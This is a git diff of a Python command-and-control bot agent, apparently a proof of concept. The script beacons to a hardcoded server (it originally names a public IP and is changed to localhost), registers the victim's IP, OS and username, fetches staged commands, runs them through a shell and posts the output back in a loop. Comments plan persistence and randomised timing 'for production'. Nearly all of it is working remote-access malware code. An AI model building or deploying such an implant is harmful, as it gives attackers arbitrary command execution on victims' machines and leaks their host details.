@@ -4,6 +4,8 @@ import socket
 import json 
 import platform
 import subprocess
+import random
+import getpass 
 
 """
 TODO: Create a builder script which creates this agent script 
@@ -15,7 +17,7 @@ TODO3: Create persistence on the script itself.
 # Need to have hardcoded server ip address 
 
 # This is hardcoded, for now 
-URL = 'http://138.197.74.47:5000'
+URL = 'http://localhost:5000'
 FIRSTCONTACTKEY = 'firstcontactkey'
 
 
@@ -36,17 +38,18 @@ def heartbeat():
 
     data = {'firstcontactkey': FIRSTCONTACTKEY}
 
+
     res = requests.post(url, data=data)
 
     global REGISTERKEY
     json_data = json.loads(res.text)
     REGISTERKEY = json_data['registerkey']
-    print(REGISTERKEY)
+    #print(REGISTERKEY)
 
-def register(ip, os):
+def register(ip, os, user):
     url = URL + '/register'
 
-    data = {'registerkey': REGISTERKEY, 'ip': ip, 'os': os}
+    data = {'registerkey': REGISTERKEY, 'ip': ip, 'os': os, 'user': user}
 
     res = requests.post(url,data=data)
 
@@ -55,22 +58,31 @@ def register(ip, os):
 def fetchexec(ip):
     url = URL + '/bot/' + ip + '/task'
     data = {'registerkey': REGISTERKEY}
-    res = requests.post(url, data=data)
-    json_data = json.loads(res.text)
+
+    try:
+        res = requests.post(url, data=data)
+        json_data = json.loads(res.text)
     
+    # Unable to connect to the server 
+    except Exception as e:
+        return '[-] ' + str(e)
+
     #print("[*] json_data = ", json_data)
 
+    # Command has not been staged. Return [-] and just sleep. 
     if 'command' not in json_data:
         return '[-] ' + str(json_data)
 
     else:
         command = json_data['command']
         print("[+] Command received: ", command)
-        result = subprocess.check_output(command, shell=True)
-
-        return result 
-
-
+        try:
+            result = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True, timeout=5)
+        except Exception as e: 
+            payload = "[" + str(e.returncode) + "] " + str(e.output.decode('utf-8'))
+            return "Status: FAILED " + payload 
+        
+        return result.decode('utf-8') 
 
 
 def submit_result(ip, result):
@@ -83,6 +95,9 @@ def submit_result(ip, result):
 
 def main():
 
+    user = getpass.getuser()
+    print(user)
+
     if "Linux" in platform.platform():
         host_os = 'Nix'
     elif "Windows" in platform.platform():
@@ -91,11 +106,13 @@ def main():
         print("[-] Unidentifiable OS type")
 
     ip = get_ip()
-    heartbeat()
-    register(ip,host_os)
-
+    #heartbeat()
+    #register(ip,host_os,user)
     
     while(1): 
+        heartbeat()
+        register(ip, host_os, user)
+
         result = fetchexec(ip)
 
         # If server response that the bot doesn't have anything, just sleep.
@@ -103,12 +120,15 @@ def main():
             print("[-] Sleeping...")
             time.sleep(10)
             continue
-        
-        result = result.decode('utf-8')
+
         print("[DEBUG] Result:", result)
         submit_result(ip, result)
 
-        print("[+] Sleeping...")
+        print("[+] Command feteched and executed. Sleeping ... ")
+        
+        # This is for production. For PoC, just sleep for 10 seconds.
+        #timerandom = random.randint(10,20)
+        
         time.sleep(10)
 
 
